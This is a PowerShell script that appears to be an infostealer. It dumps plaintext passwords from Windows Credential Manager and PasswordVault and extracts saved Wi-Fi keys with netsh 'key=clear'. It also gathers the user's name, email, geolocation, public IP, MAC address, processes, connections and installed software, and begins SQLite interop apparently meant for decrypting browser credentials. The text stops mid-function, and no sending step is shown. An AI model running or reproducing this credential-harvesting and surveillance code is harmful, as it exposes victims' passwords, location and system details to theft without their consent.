<#
.Synopsis
    Script to read stored credentials from credential manager and browsers
    Makes use of CredEnum API and SQLite decryption
    
.DESCRIPTION
    Script to read stored credentials from credential manager and browsers
    Makes use of CredEnum API and SQLite decryption
    Author : vimalsh@live.com

.EXAMPLE
    Get usernames and passwords from Web Credentials section of credential manager and browsers
    Get-PasswordVaultCredentials

.EXAMPLE
    Get usernames and passwords from Windows Credentials section of credential manager and browsers
    Get-CredManCreds
#>

if(Test-path ".\FileLogging.ps1")
{
. .\FileLogging.ps1
} else {
    # Redefine as this
    Function Write-LogFileEntry ($message, $Level, $IncludeErrorVar, $ClearErrorAfterLogging, $DoNotPrintToScreen )
    {
        Write-host $message
    }
}

function Get-PasswordVaultCredentials {
    $CRED_MANAGER_CREDS_LST = @()

    try
    {
        #Load the WinRT projection for the PasswordVault
        $Script:vaultType = [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
        $Script:vault =  new-object Windows.Security.Credentials.PasswordVault -ErrorAction silentlycontinue
        $Results = $Script:vault.RetrieveAll()
        foreach($credentry in  $Results)
        {
                $credobject = $Script:vault.Retrieve( $credentry.Resource, $credentry.UserName )
                $obj = New-Object PSObject                
                Add-Member -inputObject $obj -memberType NoteProperty -name "Username" -value "$($credobject.UserName)"                  
                Add-Member -inputObject $obj -memberType NoteProperty -name "Hostname" -value "$($credobject.Resource)" # URI need to be sanitised
                Add-Member -inputObject $obj -memberType NoteProperty -name "Password" -value "$($credobject.Password)" 
                $CRED_MANAGER_CREDS_LST += $obj                
        }
    }
    catch
    {
        Write-LogFileEntry "Failed to instantiate passwordvault class. $($_.InvocationInfo.PositionMessage)"
    }
    return $CRED_MANAGER_CREDS_LST
}

function Compile-Csharp ()
{
    param(
    [String] $code, 
    [Array] $References
    )

    $cp = new-object Microsoft.CSharp.CSharpCodeProvider
    $framework = $([System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory())

    # Optional Array of Reference assemblies to be added
    $refs = New-Object Collections.ArrayList
    $refs.AddRange( @("${framework}\System.dll"))
    if ($references.Count -ge 1)
    {
        $refs.AddRange($References)
    }

    $cpar = New-Object System.CodeDom.Compiler.CompilerParameters
    $cpar.GenerateInMemory = $true
    $cpar.GenerateExecutable = $false
    $cr = $cp.CompileAssemblyFromSource($cpar, $code)

    if ( $cr.Errors.Count)
    {
        $codeLines = $code.Split("`n");
        foreach ($ce in $cr.Errors)
        {
            Write-LogFileEntry "Error: $($codeLines[$($ce.Line - 1)])" -DoNotPrintToScreen
            $ce |out-default
        }
        Throw "INVALID DATA: Errors encountered while compiling code"
    }
}

Function Get-CredManCreds()
{
    $CredEnumWrapperClass = 
@'
using System;
using System.Runtime.InteropServices;

namespace CredEnum {

        public enum CRED_FLAGS : uint {
            NONE = 0x0,
            PROMPT_NOW = 0x2,
            USERNAME_TARGET = 0x4
        }

        public enum CRED_ERRORS : uint {
            ERROR_SUCCESS = 0x0,
            ERROR_INVALID_PARAMETER = 0x80070057,
            ERROR_INVALID_FLAGS = 0x800703EC,
            ERROR_NOT_FOUND = 0x80070490,
            ERROR_NO_SUCH_LOGON_SESSION = 0x80070520,
            ERROR_BAD_USERNAME = 0x8007089A
        }

        public enum CRED_PERSIST : uint {
            SESSION = 1,
            LOCAL_MACHINE = 2,
            ENTERPRISE = 3
        }

        public enum CRED_TYPE : uint {
            GENERIC = 1,
            DOMAIN_PASSWORD = 2,
            DOMAIN_CERTIFICATE = 3,
            DOMAIN_VISIBLE_PASSWORD = 4,
            GENERIC_CERTIFICATE = 5,
            DOMAIN_EXTENDED = 6,
            MAXIMUM = 7,
            MAXIMUM_EX = 1007
        }
        
        //-- [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct Credential {
            public CRED_FLAGS Flags;
            public CRED_TYPE Type;
            public string TargetName;
            public string Comment;
            public DateTime LastWritten;
            public UInt32 CredentialBlobSize;
            public string CredentialBlob;
            public CRED_PERSIST Persist;
            public UInt32 AttributeCount;
            public IntPtr Attributes;
            public string TargetAlias;
            public string UserName;
        }

        //-- [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct NativeCredential {
            public CRED_FLAGS Flags;
            public CRED_TYPE Type;
            public string TargetName;
            public string Comment;
            public System.Runtime.InteropServices.ComTypes.FILETIME LastWritten;
            public UInt32 CredentialBlobSize;
            public IntPtr CredentialBlob;
            public CRED_PERSIST Persist;
            public UInt32 AttributeCount;
            public IntPtr Attributes;
            public string TargetAlias;
            public string UserName;
        }

    //-- For Safehandling of pointer to pointer of a non-blittable type
    public class CriticalCredentialHandle : Microsoft.Win32.SafeHandles.CriticalHandleZeroOrMinusOneIsInvalid
    {
        public CriticalCredentialHandle(IntPtr preexistingHandle)
        {
            SetHandle(preexistingHandle);
        }

        private Credential TranslateNativeCred(IntPtr pCred)
        {
            NativeCredential ncred = (NativeCredential)Marshal.PtrToStructure(pCred, typeof(NativeCredential));
            Credential cred = new Credential();
            cred.Type = ncred.Type;
            cred.Flags = ncred.Flags;
            cred.Persist = (CRED_PERSIST)ncred.Persist;

            long LastWritten = ncred.LastWritten.dwHighDateTime;
            LastWritten = (LastWritten << 32) + ncred.LastWritten.dwLowDateTime;
            cred.LastWritten = DateTime.FromFileTime(LastWritten);
            cred.UserName = ncred.UserName;
            cred.TargetName = ncred.TargetName;
            cred.TargetAlias = ncred.TargetAlias;
            cred.Comment = ncred.Comment;
            cred.CredentialBlobSize = ncred.CredentialBlobSize;
            
            if (0 < ncred.CredentialBlobSize)
            {
                cred.CredentialBlob = Marshal.PtrToStringUni(ncred.CredentialBlob, (int)ncred.CredentialBlobSize / 2);
            }

            return cred;
        }

        public Credential GetCredential()
        {
            if (IsInvalid)
            {
                throw new InvalidOperationException("Invalid CriticalHandle!");
            }
            Credential cred = TranslateNativeCred(handle);
            return cred;
        }

        public Credential[] GetCredentials(int count)
        {
            if (IsInvalid)
            {
                throw new InvalidOperationException("Invalid CriticalHandle!");
            }

            Credential[] Credentials = new Credential[count];
            IntPtr pTemp = IntPtr.Zero;
            for (int inx = 0; inx < count; inx++)
            {
                pTemp = Marshal.ReadIntPtr(handle, inx * IntPtr.Size);
                Credential cred = TranslateNativeCred(pTemp);
                Credentials[inx] = cred;
            }
            return Credentials;
        }

        override protected bool ReleaseHandle()
        {
            if (IsInvalid)
            {
                return false;
            }
            //CredFree(handle);
            SetHandleAsInvalid();
            return true;
        }
    }

    //-- wrapper for CredEnumerate() winAPI 
    public class CredEnumerator {

        //-- Defining some of the types we will use for this code

        [DllImport("Advapi32.dll", SetLastError = true, EntryPoint = "CredEnumerate")]
        public static extern bool CredEnumerate([In] string Filter, [In] int Flags, out int Count, out IntPtr CredentialPtr);        

        public static Credential[] CredEnumApi(string Filter)
        {
            int count = 0;
            int Flags = 0x0;
            IntPtr pCredentials = IntPtr.Zero;

            if (string.IsNullOrEmpty(Filter) || "*" == Filter)
            {
                Filter = null;
                if (6 <= Environment.OSVersion.Version.Major)
                {
                    Flags = 0x1; //CRED_ENUMERATE_ALL_CREDENTIALS; only valid is OS >= Vista
                }
            }

            if (CredEnumerate(Filter, Flags, out count, out pCredentials))
            {
                //--allocate credentials array
                CriticalCredentialHandle CredHandle = new CriticalCredentialHandle(pCredentials);
                Credential[] Credentials = new Credential[count];
                
                Credentials = CredHandle.GetCredentials(count);

                for (int inx = 0; inx < count; inx++)
                {
                    Credential curr = Credentials[inx];                
                }                 
                return Credentials;
            }

            return null; 
        }

    } //-- end of public class CredEnumerator 

} //-- end of namespace CredEnum 
'@

    $CRED_MANAGER_CREDS_LST = @()

    try {
        # Attempt to create an instance of this class
        Compile-CSharp $CredEnumWrapperClass            
    }
    catch {
        Write-LogFileEntry "Error during compilation. $error " | Out-Null
        $error.clear()
        return $CRED_MANAGER_CREDS_LST
    }

    $Results = [CredEnum.CredEnumerator]::CredEnumApi("")
    foreach ($credentry in $Results) 
    {
        $HostName = $credentry.TargetName
        $HostName = $HostName.ToLower()
        $ServiceName = $credentry.Type
        $UserName = $credentry.UserName
        $DomainName = ""
        $includethis = $True

        try 
        {
            if ($HostName -match "termsrv/") {                  
                $HostName = $HostName.Substring($HostName.IndexOf("termsrv/"))                  
                $ServiceName = "RDP"    
                $includethis = $True       
            }
            elseif ( ($HostName -match "http://(.*)") -or ($HostName -match "https://(.*)")) {
                $HostName = $matches[1] 
                $ServiceName = "HTTP"      
                $includethis = $True            
            }
            elseif ($HostName -match "ftp://(.*)") {
                $HostName = $matches[1] 
                $ServiceName = "FTP"    
                $includethis = $True       
            }
            elseif ( ($HostName -match "domain:target=(.*)") ) {
                $HostName = $matches[1]   
                $ServiceName = "SMB"       
                $includethis = $True           
            }
            elseif ( ($HostName -match "microsoftoffice(.*)") ) {
                $ServiceName = "Outlook"                     
                $includethis = $True           
            }
            else {
                $HostName = $credentry.TargetName
                $ServiceName = $($credentry.Type)
                $includethis = $true
            }

            if ($credentry.UserName -match "@(.*)") {
                $DomainName = $matches[1]
                $UserName = $UserName.Substring(0, $UserName.IndexOf("@"))
            }
            elseif ($credentry.UserName -match "\\(.*)") {
                $DomainName = $UserName.Substring(0, $UserName.IndexOf("\\"))
                $UserName = $matches[1]
            }
            else {
                $UserName = $($credentry.UserName)
                $DomainName = ""
            }

            if ($credentry.CredentialBlob -match "^.{1,20}$") {
                $Password = $credentry.CredentialBlob
            }
            else { 
                $Password = ""
            }

            if (($includethis -eq $true) -and (![string]::IsNullOrEmpty($UserName))) {
                $obj = New-Object PSObject                
                Add-Member -inputObject $obj -memberType NoteProperty -name "Username" -value "$($credentry.UserName)"
                Add-Member -inputObject $obj -memberType NoteProperty -name "Domain" -value "$DomainName"
                Add-Member -inputObject $obj -memberType NoteProperty -name "Hostname" -value "$HostName"
                Add-Member -inputObject $obj -memberType NoteProperty -name "Password" -value "$Password"
                $CRED_MANAGER_CREDS_LST += $obj 
            }
        }
        catch {
            Write-LogFileEntry "Unexpected Exception!"
        }                   

    }

    return $CRED_MANAGER_CREDS_LST
} 

#------------------------------------------------------------------------------------------------------------------------------------

function Get-fullName {

    try {
        $fullName = Net User $Env:username | Select-String -Pattern "Full Name";$fullName = ("$fullName").TrimStart("Full Name")
    }
    catch {
        Write-Error "No name was detected" 
        return $env:UserName
        -ErrorAction SilentlyContinue
    }

    return $fullName 
}

$FN = Get-fullName

#------------------------------------------------------------------------------------------------------------------------------------

function Get-email {
    
    try {
        $email = GPRESULT -Z /USER $Env:username | Select-String -Pattern "([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})" -AllMatches;$email = ("$email").Trim()
        return $email
    }

    catch {
        Write-Error "An email was not found" 
        return "No Email Detected"
        -ErrorAction SilentlyContinue
    }        
}

$EM = Get-email

#------------------------------------------------------------------------------------------------------------------------------------

function Get-GeoLocation {
    try {
        Add-Type -AssemblyName System.Device #Required to access System.Device.Location namespace
        $GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher #Create the required object
        $GeoWatcher.Start() #Begin resolving current locaton

        while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
            Start-Sleep -Milliseconds 100 #Wait for discovery.
        }  

        if ($GeoWatcher.Permission -eq 'Denied'){
            Write-Error 'Access Denied for Location Information'
        } else {
            $GeoWatcher.Position.Location | Select Latitude,Longitude #Select the relevant results.
        }
    }
    catch {
        Write-Error "No coordinates found" 
        return "No Coordinates found"
        -ErrorAction SilentlyContinue
    } 
}

$GL = Get-GeoLocation

############################################################################################################################################################

# Get nearby wifi networks

try {
    $NearbyWifi = (netsh wlan show networks mode=Bssid | ?{$_ -like "SSID*" -or $_ -like "*Authentication*" -or $_ -like "*Encryption*"}).trim()
} catch {
    $NearbyWifi = "No nearby wifi networks detected"
}

############################################################################################################################################################

# Get info about PC

# Get IP / Network Info
try {
    $computerPubIP = (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
} catch {
    $computerPubIP = "Error getting Public IP"
}

$computerIP = get-WmiObject Win32_NetworkAdapterConfiguration | Where {$_.Ipaddress.length -gt 1}

$IsDHCPEnabled = $false
$Networks = Get-WmiObject Win32_NetworkAdapterConfiguration -Filter "DHCPEnabled=$True" | ? {$_.IPEnabled}
foreach ($Network in $Networks) {
    if($network.DHCPEnabled) {
        $IsDHCPEnabled = $true
    }
}

$MAC = ipconfig /all | Select-String -Pattern "physical" | select-object -First 1; $MAC = [string]$MAC; $MAC = $MAC.Substring($MAC.Length - 17)

############################################################################################################################################################

# Get System Info
$computerSystem = Get-CimInstance CIM_ComputerSystem
$computerBIOS = Get-CimInstance CIM_BIOSElement

$computerOs = Get-WmiObject win32_operatingsystem | select Caption, CSName, Version, @{Name="InstallDate";Expression={([WMI]'').ConvertToDateTime($_.InstallDate)}}, @{Name="LastBootUpTime";Expression={([WMI]'').ConvertToDateTime($_.LastBootUpTime)}}, @{Name="LocalDateTime";Expression={([WMI]'').ConvertToDateTime($_.LocalDateTime)}}, CurrentTimeZone, CountryCode, OSLanguage, SerialNumber, WindowsDirectory  | Format-List
$computerCpu = Get-WmiObject Win32_Processor | select DeviceID, Name, Caption, Manufacturer, MaxClockSpeed, L2CacheSize, L2CacheSpeed, L3CacheSize, L3CacheSpeed | Format-List
$computerMainboard = Get-WmiObject Win32_BaseBoard | Format-List

$computerRamCapacity = Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1} GB" -f ($_.sum / 1GB)}
$computerRam = Get-WmiObject Win32_PhysicalMemory | select DeviceLocator, @{Name="Capacity";Expression={ "{0:N1} GB" -f ($_.Capacity / 1GB)}}, ConfiguredClockSpeed, ConfiguredVoltage | Format-Table

############################################################################################################################################################

# Get HDDs
$driveType = @{
    2 = "Removable disk "
    3 = "Fixed local disk "
    4 = "Network disk "
    5 = "Compact disk "
}
$Hdds = Get-WmiObject Win32_LogicalDisk | select DeviceID, VolumeName, @{Name="DriveType";Expression={$driveType.item([int]$_.DriveType)}}, FileSystem,VolumeSerialNumber,@{Name="Size_GB";Expression={"{0:N1} GB" -f ($_.Size / 1Gb)}}, @{Name="FreeSpace_GB";Expression={"{0:N1} GB" -f ($_.FreeSpace / 1Gb)}}, @{Name="FreeSpace_percent";Expression={"{0:N1}%" -f ((100 / ($_.Size / $_.FreeSpace)))}} | Format-Table DeviceID, VolumeName,DriveType,FileSystem,VolumeSerialNumber,@{ Name="Size GB"; Expression={$_.Size_GB}; align="right"; }, @{ Name="FreeSpace GB"; Expression={$_.FreeSpace_GB}; align="right"; }, @{ Name="FreeSpace %"; Expression={$_.FreeSpace_percent}; align="right"; }

# Get COM & Serial Devices
$COMDevices = Get-Wmiobject Win32_USBControllerDevice | ForEach-Object{[Wmi]($_.Dependent)} | Select-Object Name, DeviceID, Manufacturer | Sort-Object -Descending Name | Format-Table

# Check RDP
$RDP
if ((Get-ItemProperty "hklm:\System\CurrentControlSet\Control\Terminal Server").fDenyTSConnections -eq 0) { 
    $RDP = "RDP is Enabled" 
} else {
    $RDP = "RDP is NOT enabled" 
}

############################################################################################################################################################

# Get Network Interfaces
$Network = Get-WmiObject Win32_NetworkAdapterConfiguration | where { $_.MACAddress -notlike $null }  | select Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress 

# Get wifi SSIDs and Passwords    
$WLANProfileNames = @()
# Get all the WLAN profile names
$Output = netsh.exe wlan show profiles | Select-String -pattern " : "
# Trim the output to receive only the name
Foreach($WLANProfileName in $Output) {
    $WLANProfileNames += (($WLANProfileName -split ":")[1]).Trim()
}
$WLANProfileObjects = @()
# Bind the WLAN profile names and also the password to a custom object
Foreach($WLANProfileName in $WLANProfileNames) {
    try {
        $WLANProfilePassword = (((netsh.exe wlan show profiles name="$WLANProfileName" key=clear | select-string -Pattern "Key Content") -split ":")[1]).Trim()
    } catch {
        $WLANProfilePassword = "The password is not stored in this profile"
    }
    $WLANProfileObject = New-Object PSCustomobject 
    $WLANProfileObject | Add-Member -Type NoteProperty -Name "ProfileName" -Value $WLANProfileName
    $WLANProfileObject | Add-Member -Type NoteProperty -Name "ProfilePassword" -Value $WLANProfilePassword
    $WLANProfileObjects += $WLANProfileObject
    Remove-Variable WLANProfileObject
}

$Networks = @{
    NetworkInterfaces = $Network | Out-String
    WLANProfiles = $WLANProfileObjects | Out-String
}

############################################################################################################################################################

# Local-user
$luser = Get-WmiObject -Class Win32_UserAccount | Format-Table Caption, Domain, Name, FullName, SID

# Process first
$process = Get-WmiObject win32_process | select Handle, ProcessName, ExecutablePath, CommandLine

# Get Listeners / ActiveTcpConnections
$listener = Get-NetTCPConnection | select @{Name="LocalAddress";Expression={$_.LocalAddress + ":" + $_.LocalPort}}, @{Name="RemoteAddress";Expression={$_.RemoteAddress + ":" + $_.RemotePort}}, State, AppliedSetting, OwningProcess
$listener = $listener | foreach-object {
    $listenerItem = $_
    $processItem = ($process | where { [int]$_.Handle -like [int]$listenerItem.OwningProcess })
    new-object PSObject -property @{
        "LocalAddress" = $listenerItem.LocalAddress
        "RemoteAddress" = $listenerItem.RemoteAddress
        "State" = $listenerItem.State
        "AppliedSetting" = $listenerItem.AppliedSetting
        "OwningProcess" = $listenerItem.OwningProcess
        "ProcessName" = $processItem.ProcessName
    }
} | select LocalAddress, RemoteAddress, State, AppliedSetting, OwningProcess, ProcessName | Sort-Object LocalAddress | Format-Table 

# Process last
$process = $process | Sort-Object ProcessName | Format-Table Handle, ProcessName, ExecutablePath, CommandLine

# Service
$service = Get-WmiObject win32_service | select State, Name, DisplayName, PathName, @{Name="Sort";Expression={$_.State + $_.Name}} | Sort-Object Sort | Format-Table State, Name, DisplayName, PathName

# Installed software (get uninstaller)
$software = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | where { $_.DisplayName -notlike $null } |  Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Sort-Object DisplayName | Format-Table -AutoSize

# Drivers
$drivers = Get-WmiObject Win32_PnPSignedDriver | where { $_.DeviceName -notlike $null } | select DeviceName, FriendlyName, DriverProviderName, DriverVersion

# Videocard
$videocard = Get-WmiObject Win32_VideoController | Format-Table Name, VideoProcessor, DriverVersion, CurrentHorizontalResolution, CurrentVerticalResolution

############################################################################################################################################################

# Get Credentials from PasswordVault and CredMan
$PasswordVaultCreds = Get-PasswordVaultCredentials | Format-Table -AutoSize | Out-String
$CredManCreds = Get-CredManCreds | Format-Table -AutoSize | Out-String

############################################################################################################################################################

# Add-Type -assembly System.Security
[System.reflection.assembly]::LoadWithPartialName("System.Security") > $null
[System.reflection.assembly]::LoadWithPartialName("System.IO") > $null
function DynamicLoadDll {
    Param ($dllName, $methodName)
    $UnsafeNativeMethods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    return $UnsafeNativeMethods.GetMethod('GetProcAddress', [reflection.bindingflags] "Public,Static", $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($UnsafeNativeMethods.GetMethod('GetModuleHandle')).Invoke($null, @($dllName)))), $methodName))
}
Function Get-DelegateType {
    Param (
        [Parameter(Position = 0, Mandatory = $False)] [Type[]] $parameters,
        [Parameter(Position = 1)] [Type] $returnType = [Void]
    )
    $MyDelegateType = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $MyDelegateType.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $parameters).SetImplementationFlags('Runtime, Managed')
    $MyDelegateType.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $returnType, $parameters).SetImplementationFlags('Runtime, Managed')
    return $MyDelegateType.CreateType()
}

# SQLite
if (-not ([System.Management.Automation.PSTypeName]'Win32').Type) {
    Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public static class Win32 {
  [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
   public static extern IntPtr GetModuleHandle(string lpModuleName);
  [DllImport("kernel32", CharSet=CharSet.Ansi, SetLastError=true)]
   public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
  [DllImport("kernel32", CharSet=CharSet.Ansi, SetLastError=true)]
   public static extern IntPtr LoadLibrary(string name);
  [DllImport("kernel32", CharSet=CharSet.Ansi, SetLastError=true)]
   public static extern bool FreeLibrary(IntPtr hLib);
}
'@
}
if (-not ([System.Management.Automation.PSTypeName]'WinSqlite').Type) {
    Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public static partial class WinSqlite {
   public const Int32 OK             =   0;
   public const Int32 ERROR          =   1;
   public const Int32 BUSY           =   5;
   public const Int32 CONSTRAINT     =  19; //  Violation of SQL constraint
   public const Int32 MISUSE         =  21; //  SQLite interface was used in a undefined/unsupported way (i.e. using prepared statement after finalizing it)
   public const Int32 RANGE          =  25; //  Out-of-range index in sqlite3_bind_…() or sqlite3_column_…() functions.
   public const Int32 ROW            = 100; //  sqlite3_step() has another row ready
   public const Int32 DONE           = 101; //  sqlite3_step() has finished executing
   public const Int32 INTEGER        =  1;
   public const Int32 FLOAT          =  2;
   public const Int32 TEXT           =  3;
   public const Int32 BLOB           =  4;
   public const Int32 NULL           =  5;
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_open")]
    public static extern IntPtr open(
     //   [MarshalAs(UnmanagedType.LPStr)]
           String zFilename,
       ref IntPtr ppDB       // db handle
    );
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_exec"
// , CharSet=CharSet.Ansi
   )]
    public static extern IntPtr exec (
           IntPtr db      ,    /* An open database                                               */
//         String sql     ,    /* SQL to be evaluated                                            */
           IntPtr sql     ,    /* SQL to be evaluated                                            */
           IntPtr callback,    /* int (*callback)(void*,int,char**,char**) -- Callback function  */
           IntPtr cb1stArg,    /* 1st argument to callback                                       */
       ref String errMsg       /* Error msg written here  ( char **errmsg)                       */
    );
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_errmsg" , CharSet=CharSet.Ansi)]
    public static extern IntPtr errmsg (
           IntPtr    db
    );
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_prepare_v2", CharSet=CharSet.Ansi)]
    public static extern IntPtr prepare_v2 (
           IntPtr db      ,     /* Database handle                                                  */
           String zSql    ,     /* SQL statement, UTF-8 encoded                                     */
           IntPtr nByte   ,     /* Maximum length of zSql in bytes.                                 */
      ref  IntPtr sqlite3_stmt, /* int **ppStmt -- OUT: Statement handle                            */
           IntPtr pzTail        /*  const char **pzTail  --  OUT: Pointer to unused portion of zSql */
    );
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_bind_int")]
    public static extern IntPtr bind_int(
           IntPtr           stmt,
           IntPtr /* int */ index,
           IntPtr /* int */ value);
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_bind_int64")]
    public static extern IntPtr bind_int64(
           IntPtr           stmt,
           IntPtr /* int */ index,  // TODO: Is IntPtr correct?
           Int64            value);
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_bind_double")]
    public static extern IntPtr bind_double (
           IntPtr           stmt,
           IntPtr           index,
           Double           value
    );
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_bind_text")]
    public static extern IntPtr bind_text(
           IntPtr    stmt,
           IntPtr    index,
//        [MarshalAs(UnmanagedType.LPStr)]
           IntPtr    value , /* const char*                  */
           IntPtr    x     , /* What does this parameter do? */
           IntPtr    y       /* void(*)(void*)               */
     );
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_bind_blob")]
    public static extern IntPtr bind_blob(
           IntPtr    stmt,
           Int32     index,
           IntPtr    value,
           Int32     length,   // void*
           IntPtr    funcPtr   // void(*)(void*)
    );
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_bind_null")]
    public static extern IntPtr bind_null (
           IntPtr    stmt,
           IntPtr    index
    );
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_step")]
    public static extern IntPtr step (
           IntPtr    stmt
    );
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_reset")]
    public static extern IntPtr reset (
           IntPtr    stmt
    );
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_column_count")]
    public static extern Int32 column_count ( // Int32? IntPtr? Int64?
            IntPtr   stmt
    );
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_column_type")] // Compare with sqlite3_column_decltype()
    public static extern IntPtr column_type (
            IntPtr   stmt,
            Int32    index
    );
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_column_double")]
    public static extern Double column_double (
            IntPtr   stmt,
            Int32    index
   );
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_column_int")] // TODO: should not generally sqlite3_column_int64 be used?
    public static extern IntPtr column_int(
            IntPtr   stmt,
            Int32    index
    );
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_column_int64")]
    public static extern Int64 column_int64(
            IntPtr   stmt,
            Int32    index
    );
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_column_text"
//   , CharSet=CharSet.Ansi
    )]
// [return: MarshalAs(UnmanagedType.LPStr)]
    public static extern IntPtr column_text (
            IntPtr   stmt,
            Int32    index
    );
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_column_blob"
    )]
    public static extern IntPtr column_blob (
            IntPtr   stmt,
            Int32    index
    );
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_column_bytes"
    )]
    public static extern Int32  column_bytes (
            IntPtr   stmt,
            Int32    index
    );
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_finalize")]
    public static extern IntPtr finalize (
           IntPtr    stmt
    );
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_close")]
    public static extern IntPtr close (
           IntPtr    db
    );
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_last_insert_rowid")]
    public static extern Int64 last_insert_rowid (
           IntPtr    db
    );
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_next_stmt")]
    public static extern IntPtr next_stmt (
           IntPtr    db,
           IntPtr    stmt
    );
// [DllImport("winsqlite3.dll")]
//   public static extern IntPtr sqlite3_clear_bindings(
//          IntPtr    stmt
//  );
}
"@
}

iex @'
function utf8PointerToStr([IntPtr]$charPtr) {
  [OutputType([String])]
 #
 # Create a .NET/PowerShell string from the bytes
 # that are pointed at by $charPtr
 #
   [IntPtr] $i = 0
   [IntPtr] $len = 0

   while ( [Runtime.InteropServices.Marshal]::ReadByte($charPtr, $len) -gt 0 ) {
     $len=$len+1
   }
   [byte[]] $byteArray = new-object byte[] $len

   while ( [Runtime.InteropServices.Marshal]::ReadByte($charPtr, $i) -gt 0 ) {
      $byteArray[$i] = [Runtime.InteropServices.Marshal]::ReadByte($charPtr, $i)
       $i=$i+1
   }

   return [System.Text.Encoding]::UTF8.GetString($byteArray)
}

function pointerToByteArray([IntPtr]$blobPtr, [Int32]$len) {
  [OutputType([Byte[]])]

  [byte[]] $byteArray = new-object byte[] $len

   for ($i = 0; $i -lt $len; $i++) {
      $byteArray[$i] = [Runtime.InteropServices.Marshal]::ReadByte($blobPtr, $i)
   }

 #
 # The comma between the return statement and the
 # $byteArray variable makes sure that a byte
 # array is returned rather than an array of objects.
 # See https://stackoverflow.com/a/61440166/180275
 #
   return ,$byteArray
}

function byteArrayToPointer([Byte[]] $ary) {

   [IntPtr] $heapPtr = [Runtime.InteropServices.Marshal]::AllocHGlobal($ary.Length);
   [Runtime.InteropServices.Marshal]::Copy($ary, 0, $heapPtr, $ary.Length);

   return $heapPtr
}

function strToUtf8Pointer([String] $str) {
   [OutputType([IntPtr])]
 #
 # Create a UTF-8 byte array on the unmanaged heap
 # from $str and return a pointer to that array
 #

   [Byte[]] $bytes      = [System.Text.Encoding]::UTF8.GetBytes($str);

 # Zero terminated bytes
   [Byte[]] $bytes0    = new-object 'Byte[]' ($bytes.Length + 1)
   [Array]::Copy($bytes, $bytes0, $bytes.Length)

   return byteArrayToPointer $bytes0

#  [IntPtr] $heapPtr = [Runtime.InteropServices.Marshal]::AllocHGlobal($bytes0.Length);
#  [Runtime.InteropServices.Marshal]::Copy($bytes0, 0, $heapPtr, $bytes0.Length);

#  return $heapPtr
}

class sqliteDB {

   [IntPtr] hidden $db

   sqliteDB(
      [string] $dbFileName,
      [bool  ] $new
   ) {

      if ($new) {
         if (test-path $dbFileName) {
            remove-item $dbFileName # Don't use '-errorAction ignore' to get error message
         }
      }

      $this.open($dbFileName, $new)

   }

   sqliteDB(
      [string] $dbFileName
   ) {
      $this.open($dbFileName, $false)
   }

   [void] hidden open(
      [string] $dbFileName,
      [bool  ] $new
   ) {
    #
    # This method is not intended to be called directly, but
    # rather indirectly via the class's constructor.
    # This construct is necessary because PowerShell does not allow for
    # constructor chaining.
    #   See https://stackoverflow.com/a/44414513
    # This is also the reason why this method is declared hidden.
    #

   [IntPtr] $db_ = 0
   $res = [WinSqlite]::open($dbFileName, [ref] $db_)
   $this.db = $db_
      if ($res -ne [WinSqlite]::OK) {
         throw "Could not open $dbFileName"
      }
   }


   [void] exec(
      [String]$sql
   ) {

     [String]$errMsg = ''
     [IntPtr] $heapPtr = strToUtf8Pointer($sql)
